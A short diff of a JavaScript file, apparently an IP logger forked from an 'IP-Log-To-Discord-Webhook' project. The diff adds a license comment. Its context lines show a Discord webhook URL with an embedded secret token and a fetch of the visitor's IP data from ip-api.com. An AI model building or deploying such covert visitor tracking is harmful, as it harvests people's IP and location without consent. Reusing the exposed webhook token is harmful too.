@@ -1,6 +1,9 @@
-
 var webHookUrl = "https://discord.com/api/webhooks/1170711181191807006/bkO4MXrvWl1ic_ndjr_JC9eswcQ5d3VejnFiGqFqEaiBCtTSEE3hzGCJgt4nBAWs_Uma";
 
+/*
+    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
+    License: MIT
+*/
 
 const request = async () => { // Calling a "synchronous" fetch
     const response = await fetch('https://ip-api.com/json/');
